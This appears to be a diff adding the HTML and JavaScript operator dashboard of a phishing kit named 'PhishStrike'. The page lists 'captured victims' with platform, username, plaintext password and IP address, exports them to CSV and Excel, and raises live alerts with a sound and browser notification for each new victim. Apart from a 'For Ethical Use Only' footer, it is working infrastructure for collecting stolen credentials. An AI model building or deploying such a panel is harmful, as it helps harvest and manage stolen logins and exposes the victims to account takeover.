@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PhishStrike Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#07090f;--panel:#0d1117;--panel2:#131920;
+  --accent:#00e5ff;--accent2:#7c3aed;--green:#00ff88;--red:#ff3f5f;--orange:#ff9500;
+  --text:#e2e8f0;--dim:#64748b;--border:#1e2d3d;
+}
+body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;overflow-x:hidden}
+
+/* Scrollbar */
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--panel)}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+
+/* Layout */
+.layout{display:grid;grid-template-columns:220px 1fr;min-height:100vh}
+
+/* Sidebar */
+.sidebar{background:var(--panel);border-right:1px solid var(--border);padding:1.5rem 1rem;display:flex;flex-direction:column;gap:1.5rem;position:sticky;top:0;height:100vh}
+.logo{font-family:'JetBrains Mono',monospace;font-size:1rem;font-weight:700;color:var(--accent);letter-spacing:3px;text-transform:uppercase;padding-bottom:1rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
+.logo-dot{width:8px;height:8px;background:var(--accent);border-radius:50%;animation:blink 1.5s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
+nav{display:flex;flex-direction:column;gap:4px}
+.nav-item{padding:.65rem 1rem;border-radius:8px;color:var(--dim);font-size:.875rem;font-weight:500;cursor:pointer;transition:.2s;display:flex;align-items:center;gap:10px;text-decoration:none}
+.nav-item:hover,.nav-item.active{background:rgba(0,229,255,.08);color:var(--accent)}
+.nav-item svg{width:16px;height:16px;flex-shrink:0}
+.sidebar-footer{margin-top:auto;font-size:.75rem;color:var(--dim);line-height:1.6}
+
+/* Main */
+main{padding:2rem;overflow-y:auto}
+header{display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem}
+header h1{font-size:1.5rem;font-weight:700;letter-spacing:-0.5px}
+header h1 span{color:var(--accent)}
+.header-right{display:flex;align-items:center;gap:12px}
+.live-badge{display:flex;align-items:center;gap:6px;background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.2);padding:4px 12px;border-radius:20px;font-size:.75rem;font-weight:600;color:var(--green)}
+.live-dot{width:6px;height:6px;background:var(--green);border-radius:50%;animation:blink 1.2s infinite}
+
+/* Stats */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1rem;margin-bottom:2rem}
+.stat{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:1.25rem;position:relative;overflow:hidden;transition:.3s}
+.stat:hover{border-color:var(--accent);transform:translateY(-2px)}
+.stat::after{content:'';position:absolute;top:0;left:0;width:100%;height:2px;background:var(--accent-color,var(--accent))}
+.stat.red::after{background:var(--red)} .stat.green::after{background:var(--green)} .stat.orange::after{background:var(--orange)} .stat.purple::after{background:var(--accent2)}
+.stat-label{font-size:.75rem;color:var(--dim);text-transform:uppercase;letter-spacing:.5px;margin-bottom:.5rem}
+.stat-val{font-family:'JetBrains Mono',monospace;font-size:2rem;font-weight:700;line-height:1}
+.stat-sub{font-size:.7rem;color:var(--dim);margin-top:.25rem}
+
+/* Toolbar */
+.toolbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem;flex-wrap:wrap;gap:.5rem}
+.toolbar-left{display:flex;align-items:center;gap:.5rem}
+.toolbar h2{font-size:1rem;font-weight:600}
+.count-badge{background:var(--accent);color:#000;font-size:.7rem;font-weight:700;padding:2px 8px;border-radius:10px}
+
+/* Buttons */
+.btn{display:inline-flex;align-items:center;gap:6px;padding:.5rem 1rem;border-radius:8px;border:none;font-size:.8rem;font-weight:600;cursor:pointer;transition:.2s;font-family:'Inter',sans-serif}
+.btn svg{width:14px;height:14px}
+.btn:active{transform:scale(.97)}
+.btn-primary{background:var(--accent);color:#000}
+.btn-primary:hover{background:#00c4dd}
+.btn-secondary{background:var(--panel2);color:var(--text);border:1px solid var(--border)}
+.btn-secondary:hover{border-color:var(--accent);color:var(--accent)}
+.btn-danger{background:rgba(255,63,95,.1);color:var(--red);border:1px solid rgba(255,63,95,.2)}
+.btn-danger:hover{background:var(--red);color:#fff}
+.btn-green{background:rgba(0,255,136,.1);color:var(--green);border:1px solid rgba(0,255,136,.2)}
+.btn-green:hover{background:var(--green);color:#000}
+
+/* Table */
+.table-wrap{background:var(--panel);border:1px solid var(--border);border-radius:12px;overflow:hidden}
+.table-wrap table{width:100%;border-collapse:collapse}
+th{background:#0a0f18;color:var(--dim);font-size:.7rem;text-transform:uppercase;letter-spacing:.5px;padding:.9rem 1rem;text-align:left;font-weight:600;border-bottom:1px solid var(--border)}
+td{padding:.85rem 1rem;border-bottom:1px solid rgba(30,45,61,.5);font-size:.85rem;vertical-align:middle}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:rgba(0,229,255,.02)}
+.mono{font-family:'JetBrains Mono',monospace;font-size:.78rem}
+.platform-badge{display:inline-block;padding:2px 10px;border-radius:4px;font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;background:rgba(0,229,255,.08);color:var(--accent);border:1px solid rgba(0,229,255,.15)}
+.pw-cell{color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:.78rem;cursor:pointer;position:relative}
+.pw-cell .pw-text{filter:blur(4px);transition:.2s}
+.pw-cell:hover .pw-text{filter:none}
+.ip-badge{font-size:.75rem;color:var(--dim);font-family:'JetBrains Mono',monospace}
+
+/* Empty state */
+.empty{text-align:center;padding:4rem 2rem;color:var(--dim)}
+.empty-icon{font-size:3rem;margin-bottom:1rem;opacity:.3}
+.empty p{font-size:.9rem}
+
+/* Toast */
+#toast-container{position:fixed;bottom:2rem;right:2rem;display:flex;flex-direction:column;gap:.5rem;z-index:9999}
+.toast{background:var(--panel2);border:1px solid var(--border);border-radius:10px;padding:.75rem 1.25rem;font-size:.85rem;display:flex;align-items:center;gap:10px;animation:slideIn .3s ease;min-width:250px;max-width:350px}
+.toast.success{border-color:rgba(0,255,136,.3);color:var(--green)}
+.toast.error{border-color:rgba(255,63,95,.3);color:var(--red)}
+.toast.info{border-color:rgba(0,229,255,.3);color:var(--accent)}
+@keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
+
+/* Confirm Modal */
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:1000;align-items:center;justify-content:center;backdrop-filter:blur(4px)}
+.modal-overlay.active{display:flex}
+.modal{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:2rem;max-width:380px;width:90%;text-align:center}
+.modal h3{font-size:1.1rem;margin-bottom:.75rem}
+.modal p{color:var(--dim);font-size:.875rem;margin-bottom:1.5rem}
+.modal-actions{display:flex;gap:.75rem;justify-content:center}
+
+/* New victim highlight */
+@keyframes highlight{0%{background:rgba(0,255,136,.08)}100%{background:transparent}}
+.new-row{animation:highlight 2s ease}
+</style>
+</head>
+<body>
+
+<div class="layout">
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="logo">
+      <div class="logo-dot"></div>
+      PhishStrike
+    </div>
+    <nav>
+      <a class="nav-item active" href="/">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+        Dashboard
+      </a>
+      <a class="nav-item" href="/api/export_csv" id="nav-csv">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+        Export CSV
+      </a>
+      <a class="nav-item" href="/api/export" id="nav-excel">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+        Export Excel
+      </a>
+    </nav>
+    <div class="sidebar-footer">
+      PhishStrike v2.0<br>
+      For Ethical Use Only
+    </div>
+  </aside>
+
+  <!-- Main Content -->
+  <main>
+    <header>
+      <h1>Management <span>Dashboard</span></h1>
+      <div class="header-right">
+        <div class="live-badge"><div class="live-dot"></div>Live Feed</div>
+        <button class="btn btn-primary" onclick="loadData()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+          Refresh
+        </button>
+      </div>
+    </header>
+
+    <!-- Stats -->
+    <div class="stats">
+      <div class="stat">
+        <div class="stat-label">Total Captured</div>
+        <div class="stat-val" id="stat-total">0</div>
+        <div class="stat-sub">All time</div>
+      </div>
+      <div class="stat green">
+        <div class="stat-label">Credentials</div>
+        <div class="stat-val" id="stat-creds">0</div>
+        <div class="stat-sub">Username + Password</div>
+      </div>
+      <div class="stat orange">
+        <div class="stat-label">IP Only</div>
+        <div class="stat-val" id="stat-ips">0</div>
+        <div class="stat-sub">No credentials</div>
+      </div>
+      <div class="stat purple">
+        <div class="stat-label">Platforms</div>
+        <div class="stat-val" id="stat-platforms">0</div>
+        <div class="stat-sub">Unique</div>
+      </div>
+    </div>
+
+    <!-- Table Toolbar -->
+    <div class="toolbar">
+      <div class="toolbar-left">
+        <h2>Captured Victims</h2>
+        <span class="count-badge" id="count-badge">0</span>
+      </div>
+      <div style="display:flex;gap:.5rem;flex-wrap:wrap">
+        <button class="btn btn-green" onclick="window.location='/api/export_csv'">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          CSV
+        </button>
+        <button class="btn btn-secondary" onclick="window.location='/api/export'" id="btn-excel">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+          Excel
+        </button>
+        <button class="btn btn-danger" onclick="confirmDeleteAll()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg>
+          Clear All
+        </button>
+      </div>
+    </div>
+
+    <!-- Table -->
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Platform</th>
+            <th>Username</th>
+            <th>Password</th>
+            <th>IP Address</th>
+            <th>Captured At</th>
+            <th>Action</th>
+          </tr>
+        </thead>
+        <tbody id="victims-body">
+          <tr><td colspan="7"><div class="empty"><div class="empty-icon">🎯</div><p>No victims captured yet. Start a campaign.</p></div></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </main>
+</div>
+
+<!-- Confirm Modal -->
+<div class="modal-overlay" id="confirm-modal">
+  <div class="modal">
+    <h3 id="modal-title">Confirm Action</h3>
+    <p id="modal-msg">Are you sure?</p>
+    <div class="modal-actions">
+      <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
+      <button class="btn btn-danger" id="modal-confirm-btn">Delete</button>
+    </div>
+  </div>
+</div>
+
+<!-- Toast Container -->
+<div id="toast-container"></div>
+
+<audio id="notif-sound" preload="auto">
+  <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2ozBi5arNPfpGMxBDFhqdPlqG00CC5asNPzqm03CzVgqcviqW00CC5arNLlqGoyBS1eq9PmpGMyBzBYo8TYomMsBi9Xo8bepGw2CDBlqsfao2ouBi1ep9fMrmc1CTZhqNDoqmw4Cztjq9LtqWs2CC5dqtPlp2g0CC1mq9PnpGg2DS9qqNPmpGo5DS9sqtPnpW04DjJtqdPmpG83DjVwqtPnpWo4DjZzqtPnpG44DjZ1qtPmpG44DjZ3qtPnpG01DjV4qtPmpG03DjZ5qtPmpGw5DjZ7qNPnpmw3DjV7qNPnpWs1DTV7qNPmpWc0DS97p9PmpWU0DjN7qNPmpGU2DjN8p9PnpGQ2Di57p9PmpGM2Di58p9PmpWA1Di59p9PmpWI2Di1+p9PnpGI5Di1/p9PnpGU5DC1/p9PmpWU6DC2Ap9PmpWk7DS6Cp9PmpW06DS6Ep9PmpW06DS6Gp9PmpW8" type="audio/wav">
+</audio>
+
+<script>
+const socket = io();
+let allVictims = [];
+
+function toast(msg, type='info') {
+  const c = document.getElementById('toast-container');
+  const t = document.createElement('div');
+  t.className = `toast ${type}`;
+  const icons = {success:'✅', error:'❌', info:'ℹ️'};
+  t.innerHTML = `<span>${icons[type]||'ℹ️'}</span>${msg}`;
+  c.appendChild(t);
+  setTimeout(() => { t.style.opacity='0'; t.style.transform='translateX(100%)'; t.style.transition='.3s'; setTimeout(()=>t.remove(), 300); }, 3000);
+}
+
+function loadData() {
+  fetch('/api/victims')
+    .then(r => r.json())
+    .then(data => {
+      allVictims = data;
+      renderTable(data);
+      updateStats(data);
+    })
+    .catch(() => toast('Failed to load data', 'error'));
+}
+
+function updateStats(data) {
+  const creds = data.filter(v => v.username !== 'IP_ONLY').length;
+  const ips   = data.filter(v => v.username === 'IP_ONLY').length;
+  const platforms = new Set(data.map(v => v.platform)).size;
+  document.getElementById('stat-total').textContent = data.length;
+  document.getElementById('stat-creds').textContent = creds;
+  document.getElementById('stat-ips').textContent = ips;
+  document.getElementById('stat-platforms').textContent = platforms;
+  document.getElementById('count-badge').textContent = data.length;
+}
+
+function renderTable(data) {
+  const tbody = document.getElementById('victims-body');
+  if (!data.length) {
+    tbody.innerHTML = '<tr><td colspan="7"><div class="empty"><div class="empty-icon">🎯</div><p>No victims captured yet. Start a campaign.</p></div></td></tr>';
+    return;
+  }
+  tbody.innerHTML = data.map((v, i) => `
+    <tr id="row-${v.id}">
+      <td class="mono" style="color:var(--dim)">${i+1}</td>
+      <td><span class="platform-badge">${v.platform}</span></td>
+      <td class="mono">${v.username === 'IP_ONLY' ? '<span style="color:var(--dim)">IP Only</span>' : v.username}</td>
+      <td class="pw-cell"><span class="pw-text">${v.password === 'N/A' ? '—' : v.password}</span></td>
+      <td class="ip-badge">${v.ip}</td>
+      <td style="color:var(--dim);font-size:.78rem">${v.timestamp}</td>
+      <td>
+        <button class="btn btn-danger" style="padding:4px 10px;font-size:.75rem" onclick="deleteOne(${v.id})">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:12px;height:12px"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/></svg>
+          Del
+        </button>
+      </td>
+    </tr>
+  `).join('');
+}
+
+let pendingDeleteId = null;
+let pendingDeleteAll = false;
+
+function deleteOne(id) {
+  pendingDeleteId = id;
+  pendingDeleteAll = false;
+  document.getElementById('modal-title').textContent = 'Delete Victim';
+  document.getElementById('modal-msg').textContent = 'Are you sure you want to delete this record? This cannot be undone.';
+  document.getElementById('confirm-modal').classList.add('active');
+  document.getElementById('modal-confirm-btn').onclick = doDelete;
+}
+
+function confirmDeleteAll() {
+  pendingDeleteAll = true;
+  pendingDeleteId = null;
+  document.getElementById('modal-title').textContent = 'Clear All Records';
+  document.getElementById('modal-msg').textContent = 'This will permanently delete ALL captured victims. Are you absolutely sure?';
+  document.getElementById('confirm-modal').classList.add('active');
+  document.getElementById('modal-confirm-btn').onclick = doDelete;
+}
+
+function closeModal() {
+  document.getElementById('confirm-modal').classList.remove('active');
+}
+
+function doDelete() {
+  closeModal();
+  const url = pendingDeleteAll ? '/api/delete_all' : `/api/delete/${pendingDeleteId}`;
+  fetch(url, {method:'POST'})
+    .then(r => r.json())
+    .then(res => {
+      if (res.status === 'success') {
+        toast(pendingDeleteAll ? 'All records cleared!' : 'Victim deleted!', 'success');
+        loadData();
+      } else {
+        toast('Error: ' + (res.message || 'Unknown'), 'error');
+      }
+    })
+    .catch(() => toast('Network error', 'error'));
+}
+
+// Close modal on overlay click
+document.getElementById('confirm-modal').addEventListener('click', function(e) {
+  if (e.target === this) closeModal();
+});
+
+// Socket.io live updates
+socket.on('new_victim', (data) => {
+  try { document.getElementById('notif-sound').play(); } catch(e){}
+  toast(`🔥 New victim! Platform: ${data.platform || 'Unknown'}`, 'success');
+  loadData();
+  if (Notification.permission === 'granted') {
+    new Notification('PhishStrike: New Victim!', { body: `Platform: ${data.platform}` });
+  }
+});
+
+// Request notification permission
+if (Notification.permission !== 'denied') Notification.requestPermission();
+
+// Initial load + auto-refresh every 15s
+loadData();
+setInterval(loadData, 15000);
+</script>
+</body>
+</html>
